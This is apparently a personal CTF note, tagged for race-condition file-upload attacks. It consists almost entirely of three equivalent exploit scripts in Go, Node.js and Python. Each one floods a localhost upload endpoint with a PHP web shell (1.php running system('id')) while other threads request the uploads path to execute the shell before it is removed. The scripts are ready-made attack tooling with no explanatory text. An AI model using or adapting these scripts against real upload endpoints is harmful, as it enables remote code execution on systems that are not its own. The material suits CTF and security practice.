---
创建: 2025-12-02
tags:
  - CTF/脚本/条件竞争/文件上传
---

```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 0 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```

# go

```go
package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"time"
)

const url = "http://localhost/"
const uploadUrl = url + ""
const accessUrl = url + "uploads/"
const fileField = "file"
const shellName = "1.php"
const rce = "<?php\nsystem(" + "'id'" + ");"

var res = make(chan string)
var ctx, cancel = context.WithCancel(context.Background())

func main() {
	defer func(t time.Time) {
		fmt.Printf("%8.3fms\n", time.Since(t).Seconds()*1000)
	}(time.Now())

	client := http.Client{
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
		},
	}

	for range 16 {
		go func() {
			for ctx.Err() == nil {
				access(client)
			}
		}()
		go func() {
			for ctx.Err() == nil {
				upload(client)
			}
		}()
	}

	fmt.Println(<-res)
}

func access(client http.Client) {
	resp, err := client.Get(accessUrl + shellName)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	res <- string(body)
	cancel()
}

func upload(client http.Client) {
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)

	formFile, err := writer.CreateFormFile(fileField, shellName)
	if err != nil {
		panic(err)
	}

	_, err = formFile.Write([]byte(rce))
	if err != nil {
		panic(err)
	}

	err = writer.Close()
	if err != nil {
		panic(err)
	}

	resp, err := client.Post(uploadUrl, writer.FormDataContentType(), body)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)
}
```

# nodejs

```js
import axios from 'axios';
import { Worker, parentPort, isMainThread, workerData } from 'worker_threads';

const url = 'http://localhost/';
const uploadUrl = url + '';
const accessUrl = url + 'uploads/';
const fileField = 'file';
const shellName = '1.php';
const rce = '<?php\nsystem(' + "'id'" + ');';

const DONE = 1;
const NOT_DONE = 0;

const UPLOAD = 'upload';
const ACCESS = 'access';

if (isMainThread) main();
else await work();

function main() {
  const start = process.hrtime();

  const sharedBuffer = new SharedArrayBuffer(4);
  const status = new Uint32Array(sharedBuffer).fill(NOT_DONE);

  for (let i = 0; i < 16; i++) {
    new Worker(import.meta.filename, {
      workerData: { type: UPLOAD, sharedBuffer },
    });

    new Worker(import.meta.filename, {
      workerData: { type: ACCESS, sharedBuffer },
    }).on('message', msg => {
      if (Atomics.load(status, 0) === DONE) return;
      console.log(msg);
      Atomics.store(status, 0, DONE);

      const diff = process.hrtime(start);
      const ms = diff[0] * 1000 + diff[1] / 1e6;
      console.log(`${ms.toFixed(3)} ms`);
    });
  }
}

async function work() {
  const { type, sharedBuffer } = workerData;
  const status = new Uint32Array(sharedBuffer);

  switch (type) {
    case UPLOAD:
      while (Atomics.load(status, 0) !== DONE) await upload();
      break;
    case ACCESS:
      while (Atomics.load(status, 0) !== DONE)
        await access(data => parentPort.postMessage(data));
      break;
  }

  async function upload() {
    const form = new FormData();
    form.append(fileField, new Blob([rce]), shellName);

    try {
      await axios.post(uploadUrl, form, { validateStatus: () => true });
    } catch (err) {
      console.error(err);
    }
  }

  async function access(cb) {
    try {
      const res = await axios.get(accessUrl + shellName, {
        validateStatus: () => true,
      });
      if (res.status !== 200) return;
      cb(res.data);
    } catch (err) {
      console.error(err);
    }
  }
}
```

# python

```python
import requests
import threading
import time

url = "http://localhost/"
uploadUrl = url + ""
accessUrl = url + "uploads/"
fileField = "file"
shellName = "1.php"
rce = "<?php\nsystem(" + "'id'" + ");"

s = requests.Session()
stop = threading.Event()

def upload():
    while not stop.is_set():
        s.post(uploadUrl, files={fileField: (shellName, rce.encode())})

def access():
    while not stop.is_set():
        res = s.get(accessUrl + shellName)
        if res.status_code != 200: 
            continue
        print(res.text)
        stop.set()

workers: list[threading.Thread] = []

start = time.perf_counter()

for i in range(16): 
    for target in (upload, access):
        t = threading.Thread(target=target)
        t.start()
        workers.append(t)
    
for t in workers:
    t.join()

final = time.perf_counter()

print(f"{(final - start)*1000:8.3f} ms")
```
